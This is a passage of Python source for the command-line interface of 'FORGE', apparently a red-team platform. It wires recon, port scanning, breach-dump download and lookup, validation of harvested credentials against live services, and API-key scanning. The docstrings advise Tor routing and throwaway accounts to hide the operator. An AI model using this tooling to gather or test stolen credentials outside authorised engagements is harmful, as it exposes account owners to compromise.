    Wired into CLI commands (Phase 4 correlate, Phase 6 report_generate) so
    every operator action leaves a tamper-evident receipt in the engagement
    DB alongside per-module _audit() writes from scanners. Uses the same
    column shape as SupabaseScanner._audit for consistency. Missing table or
    permission errors are swallowed so audit-log failure never blocks the
    primary action; a warning is logged at debug level.
    """
    try:
        operator = os.environ.get("FORGE_OPERATOR", "unknown")
        with sqlite3.connect(db_path) as con:
            con.execute(
                """
                INSERT INTO audit_log
                    (engagement_id, phase, module, action, target, result, operator, logged_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))
                """,
                (engagement_id, phase, module, action, target, result, operator),
            )
            con.commit()
    except (sqlite3.OperationalError, sqlite3.DatabaseError) as exc:
        logging.getLogger(__name__).debug(
            "audit_log write failed (non-fatal): %s", exc
        )

# ---------------------------------------------------------------------------
# Root application
# ---------------------------------------------------------------------------
app = typer.Typer(
    name="forge",
    help="FORGE — Full-Spectrum Red Team Platform (v{ver})".format(ver=VERSION),
    add_completion=False,
    no_args_is_help=True,
    pretty_exceptions_show_locals=False,  # OPSEC: never leak locals to terminal
)


# ---------------------------------------------------------------------------
# Phase sub-apps (lazy import to keep startup < 1 s)
# ---------------------------------------------------------------------------


def _make_sub(name: str, help_text: str) -> typer.Typer:
    return typer.Typer(name=name, help=help_text, no_args_is_help=True)


kb_app = _make_sub("kb", "Phase 0 — Knowledge Base ETL")
recon_app = _make_sub("recon", "Phase 1 — Reconnaissance")
osint_app = _make_sub("osint", "Phase 2 — Intelligence Operations")
evasion_app = _make_sub("evasion", "Phase 3 — Payload Preparation")
exploit_app = _make_sub("exploit", "Phase 4 — Vulnerability Correlation")
vuln_app = _make_sub("vuln", "Phase 4 — Web Vulnerability Discovery")
cloud_app = _make_sub("cloud", "Phase 4 — Cloud Misconfiguration Scanning")
graph_app = _make_sub("graph", "Phase 4 — Attack Path Visualization")
web_app = _make_sub("web", "Web Interface — Orchestration and Visibility")
auth_app = _make_sub("auth", "Authentication Testing — Brute and Bypass")
post_app = _make_sub("post", "Phase 5 — Advanced Operations")
report_app = _make_sub("report", "Phase 6 — Reporting")

# Public groups (visible in `forge --help`): kb, graph, report.
# Internal groups (hidden but still functional): recon, osint, evasion,
# exploit, vuln, cloud, web, auth, post. The kill-chain composes them.
app.add_typer(kb_app)
app.add_typer(recon_app, hidden=True)
app.add_typer(osint_app, hidden=True)
app.add_typer(evasion_app, hidden=True)
app.add_typer(exploit_app, hidden=True)
app.add_typer(vuln_app, hidden=True)
app.add_typer(cloud_app, hidden=True)
app.add_typer(graph_app)
app.add_typer(web_app, hidden=True)
app.add_typer(auth_app, hidden=True)
app.add_typer(post_app, hidden=True)
app.add_typer(report_app)


# ---------------------------------------------------------------------------
# Global callback — version flag + offline guard
# ---------------------------------------------------------------------------


@app.callback(invoke_without_command=True)
def _root_callback(
    ctx: typer.Context,
    version: bool = typer.Option(
        False, "--version", "-V", help="Print version and exit.", is_eager=True
    ),
    offline_strict: bool = typer.Option(
        False,
        "--offline-strict",
        envvar="FORGE_OFFLINE_STRICT",
        help="Abort on any attempted outbound network call.",
        hidden=True,
    ),
    no_tor: bool = typer.Option(
        False,
        "--no-tor",
        envvar="FORGE_NO_TOR",
        help=(
            "Skip Tor daemon startup even if FORGE_PROXY requests it. "
            "Speeds up offline commands (kb status, exploit correlate, "
            "report generate, scaffold) that never make outbound calls."
        ),
    ),
) -> None:
    if version:
        console.print(f"[bold]FORGE[/bold] v{VERSION}")
        raise typer.Exit()
    if ctx.resilient_parsing:
        return

    cfg = ForgeConfig.load()
    if offline_strict or cfg.offline_strict:
        # Patch socket at process level — no module escape possible.
        import socket  # noqa: PLC0415

        _deny = lambda *a, **kw: (_ for _ in ()).throw(  # noqa: E731
            OSError("FORGE_OFFLINE_STRICT: outbound network calls are disabled.")
        )
        socket.socket = _deny  # type: ignore[assignment]

    # Tor Expert Bundle management (PRD v7.2 §12.4).
    # If FORGE_PROXY points to localhost Tor, start the daemon if not running.
    # --no-tor (or FORGE_NO_TOR=1) short-circuits this — critical for offline
    # commands and for scaffolding into non-repo directories where the vendor
    # tor bundle isn't present.
    if no_tor:
        # When operator explicitly opts out of Tor, ALSO clear FORGE_PROXY
        # from the process env so downstream modules don't route through a
        # SOCKS proxy pointing at a dead 127.0.0.1:9050. Otherwise every
        # httpx/curl_cffi call fails with `curl (7) Failed to connect`.
        # Cleared only for this process; .env file is untouched.
        import os
        os.environ.pop("FORGE_PROXY", None)

    if (
        cfg.is_tor_requested
        and not (offline_strict or cfg.offline_strict)
        and not no_tor
    ):
        from forge.opsec.tor import TorManager  # noqa: PLC0415
        import atexit  # noqa: PLC0415

        tor = TorManager()
        if tor.start():
            atexit.register(tor.stop)
        else:
            console.print("[bold red]OPSEC ERROR:[/bold red] Failed to bootstrap Tor daemon.")
            raise typer.Exit(code=1)


@web_app.command("start")
def web_start(
    host: Optional[str] = typer.Option(None, "--host"),
    port: Optional[int] = typer.Option(None, "--port"),
    daemon: bool = typer.Option(False, "--daemon"),
) -> None:
    cfg = ForgeConfig.load()
    web_host = host or cfg.web_host
    web_port = port or cfg.web_port
    if daemon:
        cmd = [
            sys.executable,
            "-m",
            "uvicorn",
            "forge.webui.app:create_app",
            "--factory",
            "--host",
            web_host,
            "--port",
            str(web_port),
        ]
        proc = subprocess.Popen(cmd)
        pid_file = cfg.data_dir / "webui.pid"
        pid_file.write_text(str(proc.pid), encoding="utf-8")
        console.print(f"[green]Web interface started in background (PID {proc.pid}).[/green]")
        console.print(f"[green]URL:[/green] http://{web_host}:{web_port}")
        return
    from forge.webui.app import create_server  # noqa: PLC0415

    console.print(f"[green]Starting web interface on http://{web_host}:{web_port}[/green]")
    server = create_server(host=web_host, port=web_port)
    server.run()


@web_app.command("stop")
def web_stop() -> None:
    cfg = ForgeConfig.load()
    pid_file = cfg.data_dir / "webui.pid"
    if not pid_file.exists():
        console.print("[yellow]No running web interface PID file found.[/yellow]")
        raise typer.Exit(code=0)
    pid_raw = pid_file.read_text(encoding="utf-8").strip()
    if not pid_raw.isdigit():
        pid_file.unlink(missing_ok=True)
        console.print("[yellow]Invalid PID file removed.[/yellow]")
        raise typer.Exit(code=1)
    pid = int(pid_raw)
    try:
        os.kill(pid, signal.SIGTERM)
        console.print(f"[green]Stopped web interface process {pid}.[/green]")
    except Exception as exc:
        console.print(f"[bold red]ERROR:[/bold red] Could not stop process {pid}: {exc}")
        raise typer.Exit(code=1)
    finally:
        pid_file.unlink(missing_ok=True)


@web_app.command("status")
def web_status(
    host: Optional[str] = typer.Option(None, "--host"),
    port: Optional[int] = typer.Option(None, "--port"),
) -> None:
    import socket  # noqa: PLC0415

    cfg = ForgeConfig.load()
    web_host = host or cfg.web_host
    web_port = port or cfg.web_port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.0)
    try:
        connected = sock.connect_ex((web_host, web_port)) == 0
    finally:
        sock.close()
    if connected:
        console.print(f"[green]Web interface is running at http://{web_host}:{web_port}[/green]")
    else:
        console.print(f"[yellow]Web interface is not listening at {web_host}:{web_port}[/yellow]")


@web_app.command("enqueue")
def web_enqueue(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    task_type: str = typer.Option(..., "--task-type"),
    target: Optional[str] = typer.Option(None, "--target"),
    priority: int = typer.Option(100, "--priority"),
) -> None:
    from forge.distributed.coordinator import QueueCoordinator  # noqa: PLC0415
    from forge.distributed.scheduler import ScheduledTask, TaskScheduler  # noqa: PLC0415

    cfg = ForgeConfig.load()
    coordinator = QueueCoordinator(redis_url=cfg.redis_url)
    scheduler = TaskScheduler(db_path=cfg.engagement_db_path(engagement), queue=coordinator)
    payload = {"task_type": task_type.strip().lower(), "target": (target or "").strip()}
    task_key = f"{payload['task_type']}:{payload['target'] or 'default'}"
    scheduler.schedule(
        ScheduledTask(
            engagement_id=int(engagement),
            task_key=task_key,
            payload=payload,
            priority=priority,
        )
    )
    console.print(f"[green]Task queued:[/green] {task_key}")


@web_app.command("worker-once")
def web_worker_once(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    worker_id: str = typer.Option("worker-1", "--worker-id"),
) -> None:
    from forge.distributed.coordinator import QueueCoordinator  # noqa: PLC0415
    from forge.distributed.runnable import run_scheduled_task  # noqa: PLC0415
    from forge.distributed.scheduler import TaskScheduler  # noqa: PLC0415
    from forge.distributed.worker import Worker  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    coordinator = QueueCoordinator(redis_url=cfg.redis_url)
    scheduler = TaskScheduler(db_path=db_path, queue=coordinator)
    worker = Worker(
        worker_id=worker_id,
        queue=coordinator,
        scheduler=scheduler,
        handler=lambda eid, tkey, payload: run_scheduled_task(eid, tkey, payload, db_path),
    )
    consumed = worker.run_once()
    if consumed:
        console.print("[green]Worker executed one queued task.[/green]")
    else:
        console.print("[yellow]No queued tasks available.[/yellow]")


@web_app.command("worker-loop")
def web_worker_loop(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    worker_id: str = typer.Option("worker-1", "--worker-id"),
    idle_sleep: float = typer.Option(0.5, "--idle-sleep"),
) -> None:
    from forge.distributed.coordinator import QueueCoordinator  # noqa: PLC0415
    from forge.distributed.runnable import run_scheduled_task  # noqa: PLC0415
    from forge.distributed.scheduler import TaskScheduler  # noqa: PLC0415
    from forge.distributed.worker import Worker  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    coordinator = QueueCoordinator(redis_url=cfg.redis_url)
    scheduler = TaskScheduler(db_path=db_path, queue=coordinator)
    worker = Worker(
        worker_id=worker_id,
        queue=coordinator,
        scheduler=scheduler,
        handler=lambda eid, tkey, payload: run_scheduled_task(eid, tkey, payload, db_path),
    )
    console.print(f"[green]Worker loop started:[/green] {worker_id}")
    worker.run_forever(idle_sleep_seconds=idle_sleep)


@web_app.command("automation-loop")
def web_automation_loop(
    engagement: str = typer.Option(..., "--engagement", "-e"),
) -> None:
    from forge.distributed.coordinator import QueueCoordinator  # noqa: PLC0415
    from forge.distributed.scheduler import TaskScheduler  # noqa: PLC0415
    from forge.utils.automation import AutomationEngine  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    coordinator = QueueCoordinator(redis_url=cfg.redis_url)
    scheduler = TaskScheduler(db_path=db_path, queue=coordinator)

    engine = AutomationEngine(
        engagement_id=int(engagement), queue=coordinator, scheduler=scheduler
    )
    console.print(f"[green]Automation Engine loop started for engagement:[/green] {engagement}")
    engine.run_event_loop()


# ---------------------------------------------------------------------------
# Phase 0 — Knowledge Base
# ---------------------------------------------------------------------------


@kb_app.command("sync")
def kb_sync(
    force: bool = typer.Option(False, "--force", help="Force full re-sync."),
    source: Optional[str] = typer.Option(
        None, "--source", help="Limit sync to a single source (lolbas|gtfobins|nvd|exploitdb)."
    ),
) -> None:
    """Sync offline knowledge bases (LOLBAS, GTFOBins, NVD, Exploit-DB)."""
    from forge.phase0.etl_runner import run_etl  # noqa: PLC0415

    run_etl(force=force, source_filter=source)


@kb_app.command("status")
def kb_status() -> None:
    """Show KB staleness report for all data sources."""
    from forge.phase0.etl_runner import print_staleness_report  # noqa: PLC0415

    print_staleness_report()


@kb_app.command("fetch-breach")
def kb_fetch_breach(
    url: Optional[str] = typer.Option(
        None, "--url",
        help="HTTP(S) URL of a breach dump (SQLite .db, CSV, JSON, or archive).",
    ),
    src_file: Optional[str] = typer.Option(
        None, "--file",
        help="Local path to a breach dump to copy into .forge_data/breach/.",
    ),
    name: Optional[str] = typer.Option(
        None, "--name",
        help="Output filename (default: derive from URL/file basename).",
    ),
    force: bool = typer.Option(
        False, "--force",
        help="Overwrite an existing dump with the same name.",
    ),
) -> None:
    """Download a breach dump to ``.forge_data/breach/`` for Module 2-A queries.

    Supports either ``--url`` (remote fetch via curl_cffi) or ``--file``
    (local copy). Once downloaded, point ``forge osint breach`` at it:

        forge osint breach --engagement <id> --db .forge_data/breach/<name>

    NOTE: FORGE ships no breach corpus. Operator is responsible for sourcing
    lawful dumps (own honeypot data, CIT0DAY / COMB from research archives,
    etc.) with a valid authorisation trail.
    """
    import shutil as _sh  # noqa: PLC0415
    import urllib.parse  # noqa: PLC0415

    if (url is None) == (src_file is None):
        console.print(
            "[bold red]ERROR:[/bold red] specify exactly one of --url or --file"
        )
        raise typer.Exit(code=2)

    cfg = ForgeConfig.load()
    breach_dir = cfg.data_dir / "breach"
    breach_dir.mkdir(parents=True, exist_ok=True)

    if url:
        parsed = urllib.parse.urlparse(url)
        out_name = name or Path(parsed.path).name or "breach_dump.db"
    else:
        assert src_file is not None
        out_name = name or Path(src_file).name

    out_path = breach_dir / out_name
    if out_path.exists() and not force:
        console.print(
            f"[bold red]ERROR:[/bold red] {out_path} already exists. "
            f"Use --force to overwrite."
        )
        raise typer.Exit(code=1)

    if url:
        console.print(f"[cyan]Fetching[/cyan] {url}")
        try:
            from curl_cffi import requests as _req  # noqa: PLC0415
            resp = _req.get(url, timeout=300, allow_redirects=True)
            resp.raise_for_status()
            out_path.write_bytes(resp.content)
        except Exception as exc:
            console.print(f"[bold red]Fetch failed:[/bold red] {exc}")
            raise typer.Exit(code=1)
    else:
        assert src_file is not None
        src_path = Path(src_file).expanduser().resolve()
        if not src_path.exists():
            console.print(f"[bold red]Not found:[/bold red] {src_path}")
            raise typer.Exit(code=1)
        _sh.copy2(src_path, out_path)

    console.print(
        f"[green]Breach dump ready:[/green] {out_path}  "
        f"({out_path.stat().st_size:,} bytes)"
    )
    console.print(
        f"[dim]Next:[/dim] forge osint breach --engagement <id> --db {out_path}"
    )


# ---------------------------------------------------------------------------
# Phase 1 — Reconnaissance
# ---------------------------------------------------------------------------


@recon_app.command("wizard")
def recon_wizard(
    engagement: str = typer.Option(..., "--engagement", "-e", help="Engagement ID or name."),
) -> None:
    """Launch interactive engagement wizard."""
    from forge.phase1.wizard import run_wizard  # noqa: PLC0415

    run_wizard(engagement_id=engagement)


@recon_app.command("subdomains")
def recon_subdomains(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    domain: str = typer.Option(..., "--domain", "-d"),
    resume: bool = typer.Option(True, "--resume/--no-resume"),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct subdomain-enum gating.",
    ),
) -> None:
    """Enumerate subdomains for a target domain."""
    from forge.phase1.subdomain_enum import enumerate_subdomains  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=domain,
        seed_type="domain",
    )
    found = enumerate_subdomains(
        engagement_id=engagement,
        domain=domain,
        resume=resume,
        db_path=db_path,
        operator=str(getattr(cfg, "operator", "operator") or "operator"),
    )
    from forge.cli import console
    console.print(f"\n[bold green]Recon Subdomains Complete[/bold green]: Found [cyan]{len(found)}[/cyan] subdomains.")


@recon_app.command("crawl")
def recon_crawl(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: str = typer.Option(..., "--target"),
    depth: int = typer.Option(2, "--depth"),
    screenshot: bool = typer.Option(False, "--screenshot"),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct live crawl gating.",
    ),
) -> None:
    from forge.phase1.crawler import crawl_target_sync  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    scope_values, url_prefixes = _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=target,
        seed_type="url",
    )
    screenshot_dir = cfg.data_dir / "engagements" / engagement / "screenshots"
    rows = crawl_target_sync(
        engagement_id=int(engagement),
        target_url=target,
        db_path=db_path,
        depth=depth,
        timeout=float(cfg.browser_timeout),
        screenshot=screenshot and cfg.screenshot_enabled,
        screenshot_dir=screenshot_dir,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=True,
    )
    console.print(f"[green]Crawled pages:[/green] {len(rows)}")


@recon_app.command("ports")
def recon_ports(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    timeout: float = typer.Option(0.35, "--timeout"),
    enhanced: bool = typer.Option(True, "--enhanced/--basic"),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct live port-scan gating.",
    ),
) -> None:
    from forge.phase1.port_scanner import scan_engagement, scan_engagement_enhanced  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    scope_values, _url_prefixes = _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
    )
    if not scope_values:
        raise typer.BadParameter(
            "direct recon ports requires domain/IP scope in --scope-manifest or engagement scope_json."
        )
    if enhanced:
        findings = scan_engagement_enhanced(
            engagement_id=engagement,
            db_path=db_path,
            timeout=timeout,
            use_shodan=cfg.shodan_key is not None,
            detect_cdn=cfg.cdn_detection,
            detect_waf=cfg.waf_detection,
            scope_override=scope_values,
        )
        console.print(f"[green]Enhanced open-port findings:[/green] {len(findings)}")
        return
    findings_basic = scan_engagement(
        engagement_id=engagement,
        db_path=db_path,
        timeout=timeout,
        scope_override=scope_values,
    )
    console.print(f"[green]Basic open-port findings:[/green] {len(findings_basic)}")


# ---------------------------------------------------------------------------
# Phase 2 — OSINT & Credential Intelligence
# ---------------------------------------------------------------------------


@osint_app.command("breach")
def osint_breach(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    db: str = typer.Option(..., "--db", help="Path to breach database file."),
    fmt: Optional[str] = typer.Option(None, "--format", help="sqlite|text|csv|basequery"),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Query breach database for engagement-scoped targets (Module 2-A)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.data_connector import BreachFormat, run_breach_query  # noqa: PLC0415

    try:
        engagement_id = int(engagement)
    except ValueError as exc:
        raise typer.BadParameter("--engagement must be a numeric engagement id") from exc

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    conn = sqlite3.connect(db_path)
    try:
        try:
            run_breach_query(
                engagement_id=engagement_id,
                db_path=Path(db),
                conn=conn,
                fmt=BreachFormat(fmt) if fmt else None,
                dry_run=dry_run,
                operator=cfg.operator,
            )
        except FileNotFoundError as exc:
            console.print(f"[yellow]Breach DB skipped:[/yellow] "
                          f"{exc}. Drop a dump file at "
                          "`.forge_data/breach/*.db` or `.forge_data/breach/*.csv` "
                          "and re-run.")
        except RuntimeError as exc:
            console.print(f"[yellow]Breach lookup skipped:[/yellow] "
                          f"{str(exc)[:200]}")
    finally:
        conn.close()


@osint_app.command("validate")
def osint_validate(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    service: str = typer.Option(..., "--service", help="ssh|http|rdp|smb|ftp|dbms"),
    host: str = typer.Option(..., "--host"),
) -> None:
    """Validate harvested credentials against a live service (Module 2-B)."""
    from forge.utils.intel.auth_check import run_validation  # noqa: PLC0415

    run_validation(engagement_id=int(engagement), service=service, host=host)


@osint_app.command("keyscan")
def osint_keyscan(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    domain: str = typer.Option(
        ...,
        "--domain",
        "-d",
        help="Target domain to search for (must match engagement scope).",
    ),
    org: Optional[str] = typer.Option(
        None, "--org", help="GitHub organisation name to restrict code search."
    ),
    github_token: Optional[str] = typer.Option(
        None,
        "--github-token",
        envvar="FORGE_GITHUB_TOKEN",
        help="GitHub PAT for code search API. Supports comma-separated token rotation.",
    ),
    gitlab_token: Optional[str] = typer.Option(
        None,
        "--gitlab-token",
        envvar="FORGE_GITLAB_TOKEN",
        help="GitLab PAT for blob search (optional). Supports comma-separated token rotation.",
    ),
    validation_proxy: Optional[str] = typer.Option(
        None,
        "--validation-proxy",
        envvar="FORGE_VALIDATION_PROXY",
        help="Proxy URI for provider validation calls (e.g., socks5://127.0.0.1:9050).",
    ),
    no_validate: bool = typer.Option(
        False,
        "--no-validate",
        help="Pattern-match only; zero outbound provider calls. Findings stored as UNCONFIRMED.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Scan public repos for exposed API keys attributed to target domain (Module 2-J).

    OPSEC: GitHub code search queries are attributed to the PAT used.
    Always use a purpose-built throwaway account — never the operator's personal account.
    Validation calls are logged by AWS/Stripe/GitHub; route through --validation-proxy.
    """
    if not no_validate and validation_proxy is None:
        console.print(
            "[bold red]OPSEC ERROR:[/bold red] --validation-proxy is required unless "
            "--no-validate is set. Validation calls without a proxy expose operator IP.\n"
            "  Use: [bold]--validation-proxy socks5://127.0.0.1:9050[/bold]\n"
            "  Or:  [bold]--no-validate[/bold]  (findings stored as UNCONFIRMED)"
        )
        raise typer.Exit(code=1)

    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.secret_finder import run_key_scanner  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)

    run_key_scanner(
        db_path=db_path,
        engagement_id=int(engagement),
        domain=domain,
        org=org,
        github_token=github_token,
        gitlab_token=gitlab_token,
        validation_proxy=validation_proxy,
        no_validate=no_validate,
        dry_run=dry_run,
        operator=cfg.operator,
    )


@osint_app.command("dehashed")
def osint_dehashed(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    query_type: str = typer.Option(
        ...,
        "--query-type",
        help="Query field: email | domain | username | ip_address",
    ),
    query_value: str = typer.Option(..., "--query-value", help="Value to search."),
    max_pages: int = typer.Option(10, "--max-pages", help="Maximum result pages to fetch."),
    cache_ttl: int = typer.Option(24, "--cache-ttl", help="Skip if synced within N hours."),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Query DeHashed breach intelligence API for target credentials (Module 2-C)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.index_query import run_dehashed_query  # noqa: PLC0415

    cfg = ForgeConfig.load()
    try:
        run_dehashed_query(
            db_path=cfg.engagement_db_path(engagement),
            engagement_id=int(engagement),
            query_type=query_type,
            query_value=query_value,
            max_pages=max_pages,
            cache_ttl_hours=cache_ttl,
            dry_run=dry_run,
        )
    except RuntimeError as exc:
        # Missing FORGE_DEHASHED_* creds / scope violation / API error —
        # treat as clean SKIP so kill-chain doesn't abort.
        console.print(f"[yellow]DeHashed skipped:[/yellow] "
                      f"{str(exc)[:200]}")
    except FileNotFoundError as exc:
        console.print(f"[yellow]DeHashed skipped:[/yellow] "
                      f"missing dependency: {exc}")


@osint_app.command("xposed")
def osint_xposed(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None,
        "--emails",
        help="Comma-separated email list override (default: from DB).",
    ),
    cache_ttl: int = typer.Option(48, "--cache-ttl", help="Skip if synced within N hours."),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Query XposedOrNot API for breach exposure metadata (Module 2-D)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.exposure_check import run_xposed_query  # noqa: PLC0415

    cfg = ForgeConfig.load()
    email_list = [e.strip() for e in emails.split(",")] if emails else None
    run_xposed_query(
        db_path=cfg.engagement_db_path(engagement),
        engagement_id=int(engagement),
        email_list=email_list,
        cache_ttl_hours=cache_ttl,
        dry_run=dry_run,
    )


@osint_app.command("harvest")
def osint_harvest(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    domain: str = typer.Option(..., "--domain", "-d"),
    sources: str = typer.Option(
        "crtsh,duckduckgo,certspotter,dnsdumpster,rapiddns",
        "--sources",
        help="Comma-separated theHarvester source list.",
    ),
    timeout: int = typer.Option(300, "--timeout", help="Subprocess kill timeout in seconds."),
    proxy: Optional[str] = typer.Option(
        None,
        "--proxy",
        envvar="FORGE_PROXY",
        help="Optional HTTP/SOCKS proxy for theHarvester subprocess requests.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Enumerate emails and subdomains via theHarvester >= 4.0.0 (Module 2-E)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.contact_enum import run_harvester  # noqa: PLC0415

    cfg = ForgeConfig.load()
    run_harvester(
        db_path=cfg.engagement_db_path(engagement),
        engagement_id=int(engagement),
        domain=domain,
        sources=sources,
        timeout=timeout,
        proxy=proxy,
        dry_run=dry_run,
    )


@osint_app.command("hibp")
def osint_hibp(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    api_key: Optional[str] = typer.Option(
        None, "--api-key", envvar="FORGE_HIBP_API_KEY",
        help="HIBP API key (optional — enables per-email lookup; domain search is always free).",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Query Have I Been Pwned for breach exposure on target emails/domains (Module 2-F).

    Free tier: domain-level breach listing (no passwords, no key needed).
    With API key: per-email breach confirmation.
    Use local_breach.py (Module 2-A) for actual credential lookup against COMB/Collection#1.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase2.hibp import query_hibp  # noqa: PLC0415
    import sqlite3  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)

    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        scope = cfg.get_engagement_scope(int(engagement), conn) if hasattr(cfg, "get_engagement_scope") else []
        result = query_hibp(
            engagement_id=int(engagement),
            engagement_scope=scope,
            eng_db_conn=conn,
            api_key=api_key or None,
            dry_run=dry_run,
        )
    console.print(f"[green]HIBP complete.[/green] Domains checked. Breaches found: {len(result.get('breaches_by_name', {}))}")
    for name, info in (result.get("breaches_by_name") or {}).items():
        console.print(f"  [yellow]{name}[/yellow] — {info.get('pwn_count', 0):,} records | {info.get('breach_date', '?')}")


@osint_app.command("emailrep")
def osint_emailrep(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None,
        "--emails",
        help="Comma-separated email list override (default: from DB).",
    ),
    api_key: Optional[str] = typer.Option(
        None,
        "--api-key",
        envvar="FORGE_EMAILREP_API_KEY",
        help="Optional EmailRep API key.",
    ),
    cache_ttl: int = typer.Option(24, "--cache-ttl", help="Skip if synced within N hours."),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """EmailRep email-reputation enrichment (Module 2-F)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.reputation_lookup import run_reputation_lookup  # noqa: PLC0415

    cfg = ForgeConfig.load()
    email_list = [e.strip() for e in emails.split(",") if e.strip()] if emails else None
    run_reputation_lookup(
        db_path=cfg.engagement_db_path(engagement),
        engagement_id=int(engagement),
        api_key=api_key,
        emails=email_list,
        cache_ttl=cache_ttl,
        dry_run=dry_run,
        operator=cfg.operator,
    )


@osint_app.command("accounts")
def osint_accounts(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None, "--emails",
        help="Comma-separated email list. Defaults to emails from the engagement DB.",
    ),
    max_workers: int = typer.Option(
        1,
        "--max-workers",
        envvar="FORGE_HOLEHE_MAX_WORKERS",
        min=1,
        max=4,
        help="Bounded outer Holehe email worker count. Defaults to 1.",
    ),
    proxy: Optional[str] = typer.Option(
        None,
        "--proxy",
        envvar="FORGE_PROXY",
        help="Optional HTTP/SOCKS proxy for Holehe subprocess requests.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Discover which services an email is registered on via holehe (Module 2-L).

    100+ free presence-check endpoints. All checks are attributed to the
    querying IP - route through a proxy if OPSEC-sensitive.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.account_exists import run_holehe  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)

    email_list = [e.strip() for e in emails.split(",")] if emails else None
    _cli_audit(
        db_path, engagement_id, "phase2", "holehe",
        "accounts_start",
        target=",".join(email_list) if email_list else "<from-db>",
        result=f"dry_run={dry_run} proxy_configured={bool(proxy)}",
    )
    try:
        n = run_holehe(
            db_path=db_path,
            engagement_id=engagement_id,
            emails=email_list,
            dry_run=dry_run,
            operator=cfg.operator,
            max_workers=max_workers,
            proxy=proxy,
        )
    except Exception as exc:
        _cli_audit(
            db_path, engagement_id, "phase2", "holehe",
            "accounts_failed", result=f"{type(exc).__name__}: {str(exc)[:180]}",
        )
        raise
    _cli_audit(
        db_path, engagement_id, "phase2", "holehe",
        "accounts_complete", result=f"accounts_upserted={n}",
    )
    console.print(f"[green]Holehe complete.[/green] Account-existence rows upserted: {n}")


@osint_app.command("phone")
def osint_phone(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    number: str = typer.Option(..., "--number", "-n",
                                help="Phone number in E.164 format (+6592348112)."),
    no_online: bool = typer.Option(False, "--no-online",
                                    help="Skip PhoneInfoga (offline parse only)."),
    max_dork_concurrency: int = typer.Option(
        1,
        "--max-dork-concurrency",
        envvar="FORGE_PHONE_DORK_MAX_CONCURRENCY",
        min=1,
        max=3,
        help="Bounded PhoneInfoga-derived public-search dork concurrency. Defaults to 1.",
    ),
) -> None:
    """Phone-number OSINT: country/carrier/type via phonenumbers, plus
    optional PhoneInfoga Google dorks + reputation checks if binary present."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.phone_lookup import lookup_phone  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    result = lookup_phone(
        number=number,
        engagement_id=int(engagement),
        db_path=db_path,
        include_online=not no_online,
        dork_max_workers=max_dork_concurrency,
    )
    parse = result.get("parse", {})
